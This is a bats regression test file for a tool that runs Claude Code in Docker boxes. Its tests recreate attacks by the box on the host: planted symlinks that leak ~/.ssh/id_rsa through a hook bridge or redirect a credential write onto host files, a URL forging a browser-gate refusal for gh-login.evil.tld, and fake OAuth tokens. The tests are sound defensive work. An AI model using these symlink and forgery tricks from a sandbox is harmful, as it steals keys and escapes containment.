printf '%s\n' my-apt-wrapper
printf '%s\n' sshd
PS
  chmod +x "$stub/ps"
  local out=""
  out="$(PATH="$stub" _pkg_manager_busy)" || out=""
  [ -z "$out" ] || {
    echo "REGRESSION: false positive, matched '$out' on a decoy"; return 1; }

  # A real manager reported with a leading path MUST still be detected. This is
  # what the basename strip is for: ps on some systems prints an absolute path,
  # and comparing the raw line there silently misses a genuinely held lock.
  cat > "$stub/ps" <<'PS2'
#!/usr/bin/env bash
printf '%s\n' sshd
printf '%s\n' /usr/bin/apt-get
PS2
  chmod +x "$stub/ps"
  out="$(PATH="$stub" _pkg_manager_busy)" || out=""
  [ "$out" = "apt-get" ] || {
    echo "REGRESSION: a path-qualified apt-get was missed (got '$out')"; return 1; }

  # And a truncated comm with no path still works.
  cat > "$stub/ps" <<'PS3'
#!/usr/bin/env bash
printf '%s\n' unattended-upgr
PS3
  chmod +x "$stub/ps"
  out="$(PATH="$stub" _pkg_manager_busy)" || out=""
  [ "$out" = "unattended-upgr" ] || {
    echo "REGRESSION: ps fallback missed a bare comm (got '$out')"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: docs/cli.md promises "Without jq on the host the box falls back to
# empty settings". Both arms of the create-time project overlay fell through to
# a verbatim `cp` instead, mounting the user's real host hook commands into the
# box, where Claude Code ran them in the container and osascript and every other
# host-only command is not there. The host bridge never started either, because
# _has_host_hooks needs jq to answer and its "no" is indistinguishable from a
# real "no hooks configured", so the hooks ran nowhere at all with no message.
# jq ships in the image but is NOT a documented host requirement.
# ─────────────────────────────────────────────────────────────────────────────

# _hide_jq (a host with no jq) lives in test/setup.bash, shared with the
# credential tests.

@test "regression vnext: a jq-less host gets empty project settings, not the real hook commands" {
  mock_docker_images "cleat"
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mkdir -p "$TEST_TEMP/project/.claude"
  cat > "$TEST_TEMP/project/.claude/settings.json" << 'EOF'
{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"osascript -e beep"}]}]}}
EOF
  _hide_jq

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  local overlay="$CLEAT_RUN_DIR/${cname}/settings/project-settings.json"
  [ -f "$overlay" ] || { echo "REGRESSION: no overlay written at all"; return 1; }
  run cat "$overlay"
  refute_output --partial "osascript"
  assert_output --partial "{}"
}

@test "regression vnext: a jq-less host gets empty project settings with the hooks cap off too" {
  mock_docker_images "cleat"
  : > "$CLEAT_GLOBAL_CONFIG"
  mkdir -p "$TEST_TEMP/project/.claude"
  cat > "$TEST_TEMP/project/.claude/settings.json" << 'EOF'
{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"osascript -e beep"}]}]}}
EOF
  _hide_jq

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  local overlay="$CLEAT_RUN_DIR/${cname}/settings/project-settings.json"
  [ -f "$overlay" ] || { echo "REGRESSION: no overlay written at all"; return 1; }
  run cat "$overlay"
  refute_output --partial "osascript"
  assert_output --partial "{}"
}

@test "regression vnext: the hooks cap says so on a host with no jq instead of forwarding nothing in silence" {
  ACTIVE_CAPS=(hooks)
  _hide_jq
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_output --partial "jq is not installed on the host"
}

@test "regression vnext: exec_claude hands a fork box's hook bridge the COPY, not the origin tree" {
  # exec_claude used to pass cmd_run's `local _workspace`, which is gone by the
  # time any caller reaches exec_claude. The real binary died on set -u (see the
  # smoke test). With strict mode stripped the name expands empty and the
  # watcher's default falls back to the project, so a fork box's host hooks
  # were pointed at the ORIGIN working tree.
  command -v jq >/dev/null 2>&1 || skip "the bridge branch needs jq on the host"
  echo '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"true"}]}]}}' > "$HOME/.claude/settings.json"
  mkdir -p "$TEST_TEMP/project"
  ACTIVE_CAPS=(hooks)
  _RESOLVED_PROJECT="$TEST_TEMP/project"
  local cname="test-fork-bridge"
  _fork_mark "$cname"
  mkdir -p "$(_fork_dir "$cname")"
  _host_open_cmd() { echo ""; }
  local rec="$TEST_TEMP/bridge_ws"
  # The bridge is spawned in the background and killed by the session cleanup,
  # so record its workspace argument and hold exec_claude at the next step
  # until the record exists. Bounded, so a bridge that never spawns fails
  # rather than hangs.
  _hook_bridge_watcher() { printf '%s\n' "$2" > "$rec.part" && mv "$rec.part" "$rec"; }
  _wait_for_coder_remap() {
    local i=0
    while [ ! -f "$rec" ] && [ "$i" -lt 50 ]; do sleep 0.1; i=$((i + 1)); done
  }
  run exec_claude "$cname" --dangerously-skip-permissions
  [ -f "$rec" ] || { echo "the hook bridge was never spawned"; return 1; }
  run cat "$rec"
  assert_output "$(_fork_dir "$cname")"
}

# Start the real hook bridge from launch directory $1 for workspace $2, the way
# exec_claude starts it from wherever cleat was run, append spool line $3, and
# wait (bounded) for the host hook to write $TEST_TEMP/hook_out. The host hook
# prints the file its event's tool_input.file_path names, as a Read or a
# formatter hook would open it.
_bridge_opens_from() {
  local launch="$1" ws="$2" ev="$3" spool="$TEST_TEMP/events.jsonl" bpid i
  mkdir -p "$HOME/.claude"
  printf '{"hooks":{"PostToolUse":[{"hooks":[{"type":"command","command":"f=$(jq -r .tool_input.file_path); cat \\"$f\\" > %s/hook_out.part 2>/dev/null; mv %s/hook_out.part %s/hook_out"}]}]}}\n' \
    "$TEST_TEMP" "$TEST_TEMP" "$TEST_TEMP" > "$HOME/.claude/settings.json"
  : > "$spool"
  ( cd "$launch" && _hook_bridge_watcher "$spool" "$ws" "box-a" ) >/dev/null 2>&1 &
  bpid=$!
  sleep 0.7
  printf '%s\n' "$ev" >> "$spool"
  for i in $(seq 1 12); do
    [ -f "$TEST_TEMP/hook_out" ] && break
    sleep 0.5
  done
  kill "$bpid" 2>/dev/null || true
  wait "$bpid" 2>/dev/null || true
}

@test "regression vnext: a relative hook path is opened from the directory it was judged in" {
  # The bridge judged a relative path field from the event's translated cwd but
  # started the hook in its own working directory, the project root. With a
  # real sub/evil/ and a planted evil -> ~/.ssh at the root, a Write event from
  # cwd /workspace/sub naming evil/id_rsa passed the check and a PostToolUse
  # hook copied the private key out.
  command -v jq >/dev/null 2>&1 || skip "the bridge needs jq on the host"
  local ws="$TEST_TEMP/proj"
  mkdir -p "$ws/sub/evil" "$TEST_TEMP/dot-ssh"
  printf 'PRIVATE-KEY\n' > "$TEST_TEMP/dot-ssh/id_rsa"
  printf 'IN-SUB\n' > "$ws/sub/evil/id_rsa"
  ln -s "$TEST_TEMP/dot-ssh" "$ws/evil"
  _bridge_opens_from "$ws" "$ws" '{"hook_event_name":"PostToolUse","transcript_path":"/t","cwd":"/workspace/sub","tool_name":"Write","tool_input":{"file_path":"evil/id_rsa","content":"x"}}'
  [ -f "$TEST_TEMP/hook_out" ] || { echo "the hook never ran"; return 1; }
  run cat "$TEST_TEMP/hook_out"
  refute_output --partial "PRIVATE-KEY"
  assert_output "IN-SUB"
}

@test "regression vnext: a fork box's hook runs in the copy, so a relative path opens the copy's file" {
  # The same mismatch in a fork box: the relative value was judged inside the
  # fork copy and opened from the ORIGIN tree, where cleat was launched.
  command -v jq >/dev/null 2>&1 || skip "the bridge needs jq on the host"
  local origin="$TEST_TEMP/origin" fork="$TEST_TEMP/fork"
  mkdir -p "$origin" "$fork/evil" "$TEST_TEMP/outside"
  printf 'TOP-SECRET\n' > "$TEST_TEMP/outside/secret"
  printf 'FORK-COPY\n' > "$fork/evil/secret"
  ln -s "$TEST_TEMP/outside" "$origin/evil"
  _RESOLVED_PROJECT="$origin"
  _bridge_opens_from "$origin" "$fork" '{"hook_event_name":"PostToolUse","transcript_path":"/t","cwd":"/workspace","tool_name":"Read","tool_input":{"file_path":"evil/secret"}}'
  [ -f "$TEST_TEMP/hook_out" ] || { echo "the hook never ran"; return 1; }
  run cat "$TEST_TEMP/hook_out"
  refute_output --partial "TOP-SECRET"
  assert_output "FORK-COPY"
}

@test "regression vnext: a Grep over more files than the path-field ceiling keeps its event" {
  # tool_response.filenames entries counted toward the 256 path fields, so a
  # Grep with head_limit 0 or more than about 253 matches dropped the whole
  # PostToolUse event, though a filenames entry is only ever nulled.
  command -v jq >/dev/null 2>&1 || skip "needs jq"
  local names
  names="$(jq -cn '[range(0; 300) | "/workspace/f\(.)"]')"
  run _hook_translate_event "{\"hook_event_name\":\"PostToolUse\",\"cwd\":\"/workspace\",\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"k\",\"output_mode\":\"files_with_matches\"},\"tool_response\":{\"filenames\":$names}}" "/Users/you/proj"
  assert_success
  assert_output --partial '"/Users/you/proj/f299"'
}

@test "regression vnext: the session key is derived under a pinned C locale" {
  # _claude_session_key pins LC_ALL=C and explains why; _derive_project_session_key
  # did not, though it feeds the same class of path. Under a UTF-8 collation the
  # A-Z range in its sed can match outside the letters it means, so the same
  # project could key differently on two runs that differ only in locale. A key
  # that moves orphans the project's entire session history and its .claude.json
  # store, which is exactly the silent loss the dot and underscore bugs caused.
  #
  # The UTF-8 locale is DISCOVERED, never hardcoded: Linux images ship C.utf8
  # and macOS ships en_US.UTF-8, and naming the wrong one makes setlocale fail
  # silently, fall back to C, and compare C against C, which passes no matter
  # what the code does.
  local utf8_locale ascii utf8
  utf8_locale="$(locale -a 2>/dev/null | grep -iE '\.(utf-?8)$' | head -1 || true)"
  [ -n "$utf8_locale" ] || skip "no UTF-8 locale available on this host"
  ascii="$(LC_ALL=C _derive_project_session_key "/tmp/Ärger_Project")"
  utf8="$(LC_ALL="$utf8_locale" _derive_project_session_key "/tmp/Ärger_Project")"
  [ "$ascii" = "$utf8" ]
}

@test "regression vnext: an ASCII project keys byte-identically to the pre-pin form" {
  # The pin must not re-key anybody. This is the exact string the old code
  # produced for this path.
  run _derive_project_session_key "/Users/marcin/Workspaces/cleat"
  assert_output "cleat-0f459ff8"
}

# ── browser refusal reporting, 2026-09-13 ───────────────────────────────────
# The destination gate's refusal notice had four defects. cleat shell and
# cleat login ran the watcher and never reported. The parse took the LAST
# url= and origin= on the line. Plain links and loopback URLs were reported
# with an allow line that could never make them open. And a URL carrying the
# marker text forged a refusal naming any host the box liked.

# Run the real watcher against one URL until it logs a decision. $1 = the URL,
# $2 = host_opens_clicks. No container name, so no callback proxy.
_vnext_watch_once() {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _browser_watcher "$dir" "true" "" "auto" "${2:-1}" >/dev/null 2>&1 &
  local wpid=$! i=0
  printf '%s' "$1" > "$dir/.browser-open"
  while [ "$i" -lt 100 ]; do
    grep -q "opening URL\|deferring URL\|$_BROWSER_BLOCKED_MARK" "$dir/.proxy-log" 2>/dev/null && break
    sleep 0.1
    i=$((i + 1))
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
}

# The interactive exec writes an authorize URL at an unlisted origin into the
# bridge file, as a login inside the box does, and returns once the watcher
# has refused it. A refusal from an earlier session is already in the log, so
# the offset guard is under test too.
_vnext_refuse_during_exec() {
  _T_BW_CLIP="$1"
  printf '[browser-watcher 09:00:00] %s origin=old.example.com url=https://old.example.com/oauth/authorize?redirect_uri=http%%3A%%2F%%2Flocalhost%%3A45454%%2Fcb\n' \
    "$_BROWSER_BLOCKED_MARK" > "$_T_BW_CLIP/.proxy-log"
  docker() {
    case "$*" in
      "exec -it "*)
        printf '%s' "https://auth.example.com/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback" > "$_T_BW_CLIP/.browser-open"
        local i=0
        while [ "$i" -lt 100 ]; do
          grep -q "$_BROWSER_BLOCKED_MARK origin=auth.example.com" "$_T_BW_CLIP/.proxy-log" 2>/dev/null && break
          sleep 0.1
          i=$((i + 1))
        done ;;
    esac
    command docker "$@"
  }
}

@test "regression vnext: cleat shell reports a browser open the gate refused" {
  # docs/cli.md promised the refusal is surfaced on the terminal when the
  # session ends. Only exec_claude read the log, so a login run from a shell
  # was refused with nothing on screen.
  mkdir -p "$TEST_TEMP/project"
  local cname; cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo "true"; }
  local clip="$CLEAT_RUN_DIR/$cname/clip"; mkdir -p "$clip"
  _vnext_refuse_during_exec "$clip"
  run cmd_shell "$TEST_TEMP/project"
  assert_success
  assert_output --partial "https://auth.example.com/oauth/authorize"
  assert_output --partial "cleat browser allow auth.example.com"
  refute_output --partial "old.example.com"
}

@test "regression vnext: cleat login reports a browser open the gate refused" {
  # cleat login promises the browser will open. When the gate refused the
  # origin, nothing said why it did not.
  mkdir -p "$TEST_TEMP/project"
  local cname; cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo "true"; }
  local clip="$CLEAT_RUN_DIR/$cname/clip"; mkdir -p "$clip"
  _vnext_refuse_during_exec "$clip"
  run cmd_login "$TEST_TEMP/project"
  assert_success
  assert_output --partial "https://auth.example.com/oauth/authorize"
  assert_output --partial "cleat browser allow auth.example.com"
  refute_output --partial "old.example.com"
}

@test "regression vnext: a refused login URL carrying return_url= and origin= is reported whole" {
  # Driven through the real watcher, so the line parsed is the line written.
  # `${l##*url=}` took the last url=, which was inside return_url=, and
  # `${l##*origin=}` took a trailing origin= the query chose.
  local u="https://auth.example.com/oauth/authorize?client_id=x&return_url=https://app.example.org/done&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback&origin=evil.example"
  _vnext_watch_once "$u" 1
  run _maybe_report_blocked_opens "$TEST_TEMP/clip/.proxy-log" 0
  assert_output --partial "$u"
  assert_output --partial "cleat browser allow auth.example.com"
  refute_output --partial "allow evil.example"
  refute_output --partial "allow app.example.org"
}

@test "regression vnext: a plain link or a loopback URL is never reported as blocked" {
  # Neither opens with its origin listed: a plain link defers even at a listed
  # origin, and cleat browser allow refuses localhost. Both used to print an
  # allow line, the second one a command the verb rejects.
  local u
  for u in "https://docs.python.org/3/library/" "http://localhost:3000/"; do
    rm -rf "$TEST_TEMP/clip"
    _vnext_watch_once "$u" 0
    run cat "$TEST_TEMP/clip/.proxy-log"
    assert_output --partial "deferring URL to terminal"
    run _maybe_report_blocked_opens "$TEST_TEMP/clip/.proxy-log" 0
    assert_output ""
  done
}

@test "regression vnext: marker text inside a URL is never read as a refusal" {
  # The box writes the URL and the watcher logs it on every branch. Searching
  # the whole line for the marker let a deferred link at a listed origin forge
  # a refusal naming a host of the box's choosing.
  # The forged text is the whole shape the watcher writes, timestamp included,
  # so only an anchor on the line's first byte tells the two apart.
  _vnext_watch_once "https://github.com/x?a=[browser-watcher 00:00:00] ${_BROWSER_BLOCKED_MARK} origin=gh-login.evil.tld url=https://gh-login.evil.tld/" 1
  run cat "$TEST_TEMP/clip/.proxy-log"
  assert_output --partial "deferring URL to terminal"
  run _maybe_report_blocked_opens "$TEST_TEMP/clip/.proxy-log" 0
  assert_success
  assert_output ""
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext and v1.4.3: _oauth_expires_at took the LAST "expiresAt" anywhere in a
# credential file. Claude Code 2.1.270 keeps MCP OAuth tokens in the same file
# under mcpOAuth, each with its own expiresAt. It writes that key after
# claudeAiOauth once an MCP login follows a Claude login. Every newest-wins
# decision then compared MCP token lifetimes. With the same 24 h MCP token in
# both copies a box's refreshed login never looked newer and was never
# harvested. Staging put an older store copy over a fresher box login whose MCP
# token happened to be older. On macOS the shared-login re-seed read an expired
# MCP token as an expired login and put the Keychain's older token over the
# box's newer one, taking the MCP logins with it.
#
# Fixtures follow the account fixture convention: the generation tag lives in
# accessToken and refreshToken names the grant, so it stays equal across
# generations. These pin the expiry decision and nothing about identity.
# ─────────────────────────────────────────────────────────────────────────────
_mcp_cred_blob() {   # $1 = access-token tag, $2 = claudeAiOauth.expiresAt, $3 = the MCP entry's expiresAt
  printf '{"claudeAiOauth":{"accessToken":"sk-ant-oat01-%s","refreshToken":"sk-ant-ort01-SAME","expiresAt":%s,"scopes":["user:inference","user:profile"],"subscriptionType":"max","rateLimitTier":"default_claude_max_20x"},"mcpOAuth":{"labmcp|cda6d80a97111f6e":{"serverName":"labmcp","serverUrl":"http://127.0.0.1:36963/mcp","accessToken":"FAKE-MCP-at","discoveryState":{"authorizationServerUrl":"http://127.0.0.1:36963","oauthMetadataFound":true},"clientId":"lab-mcp-client","refreshToken":"FAKE-MCP-rt","expiresAt":%s,"scope":"read"}}}' "$1" "$2" "$3"
}

@test "regression vnext: account newest-wins reads the Claude login expiry, not an MCP entry written after it" {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR"
  _CLEAT_NOW_S=1789000000
  curl() { cat >/dev/null 2>&1; return 7; }
  local cn="cleat-proj-abcdef12" now_ms=1789000000000 h=3600000 store box mode
  _box_account_write "$cn" work
  _account_ensure_dir work
  store="$(_account_cred_path work)"
  box="$(_account_box_auth_dir "$cn")/.credentials.json"
  mkdir -p "${box%/*}"
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    # Harvest: the box refreshed its login. Both copies hold the same MCP token.
    _mcp_cred_blob STALE $((now_ms + h)) $((now_ms + 24 * h)) > "$store"
    _mcp_cred_blob REFRESHED $((now_ms + 8 * h)) $((now_ms + 24 * h)) > "$box"
    run _account_sync_out "$cn"
    run cat "$store"
    assert_output --partial "sk-ant-oat01-REFRESHED"
    # Stage: the store holds the newer login, the box an older one whose MCP
    # token runs for a week.
    _mcp_cred_blob NEWER $((now_ms + 8 * h)) $((now_ms - 48 * h)) > "$store"
    _mcp_cred_blob OLDER $((now_ms + 2 * h)) $((now_ms + 168 * h)) > "$box"
    run _account_sync_in "$cn"
    run cat "$box"
    assert_output --partial "sk-ant-oat01-NEWER"
  done
}

@test "regression v1.4.3: the macOS re-seed keeps a box-refreshed login when an expired MCP login shares the file" {
  _is_macos() { return 0; }
  _macos_keychain_credentials() {
    printf '%s' '{"claudeAiOauth":{"accessToken":"KC-OLDER","refreshToken":"rt-kc","expiresAt":2000003600000}}'
  }
  local cred="$HOME/.claude/.credentials.json" leg order
  mkdir -p "$HOME/.claude"
  # now_ms 2e12. The box login is valid 7 h, its MCP entry expired 3 d ago and
  # the Keychain login is valid 1 h.
  local claude='"claudeAiOauth":{"accessToken":"BOX-REFRESHED","refreshToken":"rt-box","expiresAt":2000025200000,"scopes":["user:inference"],"subscriptionType":"max"}'
  local mcp='"mcpOAuth":{"linear|0123456789abcdef":{"serverName":"linear","serverUrl":"https://mcp.linear.app/mcp","accessToken":"MCP-LOGIN","refreshToken":"mcp-rt","expiresAt":1999740800000,"scope":"read write"}}'
  for leg in jq nojq; do
    [ "$leg" = nojq ] && _hide_jq
    for order in claude-first mcp-first; do
      if [ "$order" = claude-first ]; then
        printf '{%s,%s}' "$claude" "$mcp" > "$cred"
      else
        printf '{%s,%s}' "$mcp" "$claude" > "$cred"
      fi
      _SEEDED_CREDS=0
      _CLEAT_NOW_S=2000000000 _seed_macos_credentials
      run cat "$cred"
      assert_output --partial "BOX-REFRESHED"
      assert_output --partial "MCP-LOGIN"
      refute_output --partial "KC-OLDER"
      assert_equal "$leg $order $_SEEDED_CREDS" "$leg $order 0"
    done
  done
}

@test "regression v1.4.3: an unreadable shared credential file does not abort the macOS launch" {
  # The seed runs bare in exec_claude under set -e. Its read of the shared file
  # was a redirect. A redirect that cannot open the file fails the whole
  # assignment, so `cleat` exited before Claude started with nothing but a raw
  # "Permission denied". Sourced tests strip strict mode, so this one puts it back.
  [ "$(id -u)" != "0" ] || skip "root reads a mode-000 file"
  mkdir -p "$HOME/.claude"
  printf '{"claudeAiOauth":{"accessToken":"a","expiresAt":1}}' > "$HOME/.claude/.credentials.json"
  chmod 000 "$HOME/.claude/.credentials.json"
  run bash -c 'set -euo pipefail; source "$1"; set -euo pipefail
    _is_macos() { return 0; }
    _macos_keychain_credentials() { return 1; }
    _seed_macos_credentials
    echo "launch continues"' _ "$CLI"
  chmod 600 "$HOME/.claude/.credentials.json"
  assert_success
  assert_output --partial "launch continues"
  refute_output --partial "Permission denied"
}

@test "regression v1.4.3: macOS seed never writes the token through a planted temp symlink" {
  # ~/.claude is mounted read-write into every box. The seed wrote the Keychain
  # login to "$cred.tmp.$$", a name a box can guess, through a bare `>` that
  # follows a symlink. A box that planted one there had the live login written
  # onto any host file the user can write. The mv then made the credential
  # file itself a link to it.
  _is_macos() { return 0; }
  # seed_blob and not blob: the CLI's own `local blob` would shadow it.
  local seed_blob='{"claudeAiOauth":{"accessToken":"sk-ant-oat01-KEYCHAIN","refreshToken":"rt","expiresAt":3000000000000}}'
  _macos_keychain_credentials() { printf '%s' "$seed_blob"; }
  local cred="$HOME/.claude/.credentials.json" victim="$TEST_TEMP/precious-host-file" leg
  mkdir -p "$HOME/.claude"
  printf 'DO-NOT-OVERWRITE\n' > "$victim"
  chmod 644 "$victim"
  ln -s "$victim" "${cred}.tmp.$$"
  for leg in jq nojq; do
    [ "$leg" = nojq ] && _hide_jq
    : > "$cred"
    _SEEDED_CREDS=0
    _seed_macos_credentials
    run cat "$victim"
    assert_output "DO-NOT-OVERWRITE"
    [ ! -L "$cred" ] || { echo "$leg: the credential file became a symlink"; return 1; }
    run cat "$cred"
    assert_output "$seed_blob"
    assert_equal "$leg $_SEEDED_CREDS" "$leg 1"
  done
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: the credential readers were not scoped to the Claude login. With jq
# they took the first accessToken or refreshToken anywhere in the file and
# without jq the last. Claude Code 2.1.270 keeps each MCP server's OAuth tokens
# in the same file under mcpOAuth. It writes that key BEFORE claudeAiOauth when
# the MCP login came first and AFTER it otherwise. So the order of two logins,
# not their meaning, picked the token. On a jq host the usage poll sent the MCP
# server's bearer to api.anthropic.com. On a jq-less host a blanked Claude login
# beside a live MCP entry read as plausible and was harvested over the account's
# only good credential, with no trash and no undo.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: the usage poll sends the account's own bearer, never a coresident MCP token" {
  command -v jq >/dev/null || skip "the usage poll needs jq"
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  mkdir -p "$CLEAT_ACCOUNTS_DIR"
  _CLEAT_NOW_S=1789000000
  local exp=1789007200000 order acct
  local claude="\"claudeAiOauth\":{\"accessToken\":\"sk-ant-oat01-ACCOUNT-OWN\",\"refreshToken\":\"sk-ant-ort01-ACCOUNT-OWN\",\"expiresAt\":$exp,\"scopes\":[\"user:inference\",\"user:profile\"],\"subscriptionType\":\"max\"}"
  local mcp="\"mcpOAuth\":{\"linear|0123456789abcdef\":{\"serverName\":\"linear\",\"serverUrl\":\"https://mcp.linear.app/mcp\",\"accessToken\":\"MCP-SERVER-TOKEN\",\"refreshToken\":\"MCP-SERVER-REFRESH\",\"expiresAt\":1789086400000,\"scope\":\"read write\"}}"
  # Both orders, so a reader that takes the first match anywhere and one that
  # takes the last each fail one of them.
  for order in cm mc; do
    acct="acct-$order"
    _account_ensure_dir "$acct"
    if [ "$order" = cm ]; then
      printf '{%s,%s}' "$claude" "$mcp" > "$(_account_cred_path "$acct")"
    else
      printf '{%s,%s}' "$mcp" "$claude" > "$(_account_cred_path "$acct")"
    fi
    curl() {
      cat > "$TEST_TEMP/curl-$order.cfg"
      printf '{"five_hour":{"utilization":10,"resets_at":"2026-09-13T20:00:00Z"},"seven_day":{"utilization":20,"resets_at":"2026-09-15T20:00:00Z"}}'
    }
    run _account_usage_fetch "$acct"
    assert_success
    run cat "$TEST_TEMP/curl-$order.cfg"
    assert_output --partial "Authorization: Bearer sk-ant-oat01-ACCOUNT-OWN\""
    refute_output --partial "MCP-SERVER"
  done
}

@test "regression vnext: a jq-less host does not harvest a blanked login over a good store" {
  _hide_jq
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR"
  _CLEAT_NOW_S=1789000000
  curl() { cat >/dev/null 2>&1; return 7; }
  local cn="cleat-proj-abcdef12" store box order
  _box_account_write "$cn" work
  _account_ensure_dir work
  store="$(_account_cred_path work)"
  box="$(_account_box_auth_dir "$cn")/.credentials.json"
  mkdir -p "${box%/*}"
  # The login invalid_grant blanked beside a live MCP entry. Its expiry reads
  # newer, which a box can always write, so only the plausibility of the Claude
  # login's own tokens stands between it and the store. The report's case is cm
  # (the MCP entry written after the login). mc fails a first-match reader.
  local blanked='"claudeAiOauth":{"accessToken":"","refreshToken":"","expiresAt":1789007200000,"scopes":["user:inference"],"subscriptionType":"max"}'
  local mcp='"mcpOAuth":{"labmcp|cda6d80a97111f6e":{"serverName":"labmcp","serverUrl":"http://127.0.0.1:36963/mcp","accessToken":"FAKE-MCP-at-1","clientId":"lab-mcp-client","refreshToken":"FAKE-MCP-rt-1","expiresAt":1789086400000,"scope":"read"}}'
  for order in cm mc; do
    printf '{"claudeAiOauth":{"accessToken":"sk-ant-oat01-GOOD","refreshToken":"sk-ant-ort01-GOOD","expiresAt":1789003600000,"subscriptionType":"max"}}' > "$store"
    if [ "$order" = cm ]; then
      printf '{%s,%s}' "$blanked" "$mcp" > "$box"
    else
      printf '{%s,%s}' "$mcp" "$blanked" > "$box"
    fi
    run _account_sync_out "$cn"
    assert_equal "$order $status" "$order 1"
    run cat "$store"
    assert_output --partial '"refreshToken":"sk-ant-ort01-GOOD"'
    refute_output --partial "FAKE-MCP"
  done
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: nothing serialised the account code across cleat processes. Every
# account path read a pin, a store and a staged credential, decided and wrote,
# and two terminals interleaved. An attach that had read pin a staged a's login
# over the b a concurrent switch had just staged (5 in 100 natural runs), so the
# box ran as a while pinned to b. A session-end harvest wrote b's credential
# into a's store. An attach that read the pin between a rename's move and its
# pin rewrite found no store and deleted the staged login. And the harvest read
# the staged path again at write time, so bytes the box wrote after the checks
# (a blanked login, or a symlink to any host file the user can read) went into
# the store unchecked.
#
# Each race is made deterministic the same way. A function that runs INSIDE the
# critical section under test is wrapped so that its first call starts the
# competing command in the background, then waits until that command has either
# finished or is waiting on the account lock (_account_lock_pause). With no lock
# the competitor always finishes first and the interleaving that corrupted the
# store is replayed exactly. With the lock it can only be waiting. The sleeps
# are poll intervals. None of them decides an outcome.
#
# Fixtures follow the account fixture convention: accessToken carries the
# generation (at-A1) and refreshToken the grant (rt-A).
# ─────────────────────────────────────────────────────────────────────────────
_acct_race_setup() {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  _CLEAT_NOW_S=1789000000
  _has_unicode() { return 1; }
  _daemon_up() { return 1; }
  container_exists() { return 1; }
  _box_has_live_agent() { return 1; }
  # A switch away from a pinned account polls usage. Never the real network.
  curl() { cat >/dev/null 2>&1; return 7; }
  _ACCOUNT_LOCK_WAIT_S=60
}

# $1 file, $2 grant, $3 generation, $4 expiresAt (epoch ms)
_acct_race_cred() {
  mkdir -p "${1%/*}"
  printf '{"claudeAiOauth":{"accessToken":"at-%s%s","refreshToken":"rt-%s","expiresAt":%s,"subscriptionType":"max"}}\n' "$2" "$3" "$2" "$4" > "$1"
  chmod 600 "$1"
}

_acct_race_start() {
  _account_lock_pause() { : > "$TEST_TEMP/race.waiting"; sleep 0.05; }
  # The competitor holds nothing: the lock depth this shell inherits at the
  # fork belongs to the holder.
  ( _ACCOUNT_LOCK_DEPTH=0; "$@" > "$TEST_TEMP/race.out" 2>&1; : > "$TEST_TEMP/race.done" ) 3>&- &
  _ACCT_RACE_PID=$!
  local i=0
  while [[ ! -e "$TEST_TEMP/race.waiting" && ! -e "$TEST_TEMP/race.done" && $i -lt 1200 ]]; do
    sleep 0.05
    i=$(( i + 1 ))
  done
}

# _acct_race_on FUNCTION COMMAND...: the first call of FUNCTION starts COMMAND.
_acct_race_on() {
  local fn="$1"
  shift
  _ACCT_RACE_CMD=("$@")
  eval "$(declare -f "$fn" | sed "1s/^$fn /_acct_race_orig_$fn /")"
  eval "$fn() {
    if [[ ! -e \"\$TEST_TEMP/race.hooked\" ]]; then
      : > \"\$TEST_TEMP/race.hooked\"
      _acct_race_start \"\${_ACCT_RACE_CMD[@]}\"
    fi
    _acct_race_orig_$fn \"\$@\"
  }"
}

_acct_race_joined() {
  run test -e "$TEST_TEMP/race.hooked"
  assert_success
  wait "$_ACCT_RACE_PID"
}

@test "regression vnext: an attach cannot stage the old account after a concurrent switch pinned the new one" {
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  # Another box refreshed a since this one ran, so the attach has something to stage.
